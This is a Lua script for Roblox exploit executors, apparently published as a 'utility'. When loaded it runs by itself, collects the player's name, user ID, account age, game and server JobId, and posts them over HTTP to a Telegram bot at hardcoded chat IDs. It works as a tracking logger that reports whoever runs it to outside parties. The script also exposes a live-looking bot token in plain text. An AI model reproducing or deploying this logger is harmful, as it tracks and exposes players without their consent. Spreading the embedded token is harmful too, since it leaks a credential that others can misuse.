-- ============================================
-- DIX TELEGRAM NOTIFIER v2.0
-- Токен: 8280009941:AAHGEFUVh1Zo0xoGlm7S3DSc0m4txvxPyNA
-- Chat IDs: 1656728406, 6306634131
-- ============================================

local DIX = {
    _VERSION = "2.0.1",
    _AUTHOR = "Stalker-2033",
    _REPO = "github.com/Stalker-2033/Roblox-Utility-Script"
}

-- Конфигурация (ваши данные)
DIX.Config = {
    BOT_TOKEN = "8280009941:AAHGEFUVh1Zo0xoGlm7S3DSc0m4txvxPyNA",
    CHAT_IDS = {1656728406, 6306634131},
    SECURITY_KEY = nil,
    ENABLE_LOGGING = true
}

-- Проверка HTTP функций
function DIX.checkEnvironment()
    if not (syn or request or http and http.request) then
        warn("[DIX] ❌ HTTP функции недоступны")
        return false
    end
    return true
end

-- Получение HTTP функции
function DIX.getHttpFunction()
    if syn and syn.request then
        return syn.request
    elseif request then
        return request
    elseif http and http.request then
        return http.request
    end
    return nil
end

-- Сбор системной информации
function DIX.collectSystemInfo()
    local player = game:GetService("Players").LocalPlayer
    local success, placeInfo = pcall(function()
        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
    end)
    
    return {
        user = {
            name = player.Name,
            id = player.UserId,
            displayName = player.DisplayName,
            accountAge = player.AccountAge
        },
        game = {
            placeId = game.PlaceId,
            jobId = game.JobId,
            name = success and placeInfo.Name or "Unknown",
            description = success and placeInfo.Description or "N/A"
        },
        system = {
            time = os.date("%Y-%m-%d %H:%M:%S"),
            timestamp = os.time(),
            platform = tostring(game:GetService("UserInputService"):GetPlatform())
        }
    }
end

-- Форматирование сообщения для Telegram
function DIX.formatMessage(info, style)
    style = style or "detailed"
    
    local templates = {
        simple = string.format(
            "👤 %s\n🆔 %d\n🎮 %s\n🕐 %s",
            info.user.name,
            info.user.id,
            info.game.name,
            info.system.time
        ),
        
        detailed = string.format(
            "<b>🚀 DIX SYSTEM REPORT</b>\n\n" ..
            "<b>👤 USER INFORMATION</b>\n" ..
            "• Name: <code>%s</code>\n" ..
            "• UserID: <code>%d</code>\n" ..
            "• Display: %s\n" ..
            "• Account Age: %d days\n\n" ..
            "<b>🎮 GAME INFORMATION</b>\n" ..
            "• Game: %s\n" ..
            "• PlaceID: <code>%d</code>\n" ..
            "• Server: <code>%s</code>\n\n" ..
            "<b>📊 SYSTEM INFORMATION</b>\n" ..
            "• Time: %s\n" ..
            "• Platform: %s\n" ..
            "• Version: %s",
            info.user.name,
            info.user.id,
            info.user.displayName,
            info.user.accountAge,
            info.game.name,
            info.game.placeId,
            info.game.jobId:sub(1, 8),
            info.system.time,
            info.system.platform,
            DIX._VERSION
        ),
        
        minimal = string.format(
            "DIX | %s (%d) | %s | %s",
            info.user.name,
            info.user.id,
            info.game.name,
            info.system.time
        )
    }
    
    return templates[style] or templates.detailed
end

-- Отправка сообщения в Telegram
function DIX.sendTelegramMessage(text, options)
    options = options or {}
    
    local httpFunc = DIX.getHttpFunction()
    if not httpFunc then
        return false, "HTTP функция недоступна"
    end
    
    if not DIX.Config.BOT_TOKEN then
        return false, "BOT_TOKEN не настроен"
    end
    
    local results = {}
    local successCount = 0
    
    for _, chatId in ipairs(DIX.Config.CHAT_IDS) do
        for attempt = 1, (options.maxRetries or 3) do
            local success, response = pcall(function()
                return httpFunc({
                    Url = "https://api.telegram.org/bot" .. DIX.Config.BOT_TOKEN .. "/sendMessage",
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json",
                        ["X-DIX-Version"] = DIX._VERSION
                    },
                    Body = game:GetService("HttpService"):JSONEncode({
                        chat_id = chatId,
                        text = text,
                        parse_mode = options.parse_mode or "HTML",
                        disable_web_page_preview = options.disable_preview ~= false,
                        disable_notification = options.silent or false
                    })
                })
            end)
            
            if success then
                results[chatId] = {
                    success = true,
                    attempt = attempt,
                    response = response
                }
                successCount = successCount + 1
                break
            elseif attempt == (options.maxRetries or 3) then
                results[chatId] = {
                    success = false,
                    attempt = attempt,
                    error = response
                }
            end
            
            if attempt < (options.maxRetries or 3) then
                task.wait(1) -- Задержка между попытками
            end
        end
    end
    
    return {
        total = #DIX.Config.CHAT_IDS,
        successful = successCount,
        failed = #DIX.Config.CHAT_IDS - successCount,
        details = results
    }
end

-- Основная функция инициализации
function DIX.init(customConfig)
    print(string.format("[DIX] 🔧 Initializing v%s", DIX._VERSION))
    
    -- Обновление конфигурации
    if customConfig then
        for key, value in pairs(customConfig) do
            DIX.Config[key] = value
        end
    end
    
    -- Проверка окружения
    if not DIX.checkEnvironment() then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "❌ DIX Error",
            Text = "HTTP functions not available",
            Duration = 5
        })
        return false
    end
    
    -- Сбор информации
    local systemInfo = DIX.collectSystemInfo()
    
    -- Форматирование сообщения
    local message = DIX.formatMessage(systemInfo, "detailed")
    
    -- Отправка в Telegram
    local sendResult = DIX.sendTelegramMessage(message, {
        parse_mode = "HTML",
        disable_preview = true,
        maxRetries = 3
    })
    
    -- Логирование
    if DIX.Config.ENABLE_LOGGING then
        print(string.format(
            "[DIX] 📊 Send results: %d/%d successful",
            sendResult.successful,
            sendResult.total
        ))
        
        for chatId, result in pairs(sendResult.details) do
            if result.success then
                print(string.format("[DIX] ✅ Chat %s: OK (attempt %d)", chatId, result.attempt))
            else
                warn(string.format("[DIX] ❌ Chat %s: Failed - %s", chatId, result.error))
            end
        end
    end
    
    -- Уведомление в Roblox
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = sendResult.successful > 0 and "✅ DIX Active" or "⚠️ DIX Warning",
        Text = string.format("%d/%d messages sent", sendResult.successful, sendResult.total),
        Duration = 3,
        Icon = "rbxassetid://4483345998"
    })
    
    -- Возврат результатов
    return {
        version = DIX._VERSION,
        config = DIX.Config,
        systemInfo = systemInfo,
        sendResult = sendResult,
        timestamp = os.time()
    }
end

-- Функция для отправки кастомных сообщений
function DIX.sendCustomMessage(text, chatIds)
    chatIds = chatIds or DIX.Config.CHAT_IDS
    
    local message = string.format(
        "<b>💬 CUSTOM MESSAGE</b>\n\n" ..
        "%s\n\n" ..
        "<i>Sent via DIX System v%s</i>",
        text,
        DIX._VERSION
    )
    
    return DIX.sendTelegramMessage(message, {
        parse_mode = "HTML",
        disable_preview = true
    })
end

-- Функция для отправки ошибок
function DIX.sendError(errorMsg, context)
    local message = string.format(
        "<b>⚠️ DIX ERROR REPORT</b>\n\n" ..
        "<b>Error:</b> <code>%s</code>\n" ..
        "<b>Context:</b> %s\n\n" ..
        "<b>System Info:</b>\n" ..
        "• User: %s\n" ..
        "• Place: %d\n" ..
        "• Time: %s",
        tostring(errorMsg):gsub("<", "&lt;"):gsub(">", "&gt;"),
        context or "No context",
        game:GetService("Players").LocalPlayer.Name,
        game.PlaceId,
        os.date()
    )
    
    return DIX.sendTelegramMessage(message, {
        parse_mode = "HTML",
        disable_preview = true
    })
end

-- Автоматическая инициализация при загрузке
local autoInitSuccess, autoInitError = pcall(function()
    DIX.init()
end)

if not autoInitSuccess and DIX.Config.ENABLE_LOGGING then
    warn("[DIX] Auto-init error:", autoInitError)
end

-- Экспорт API
return DIX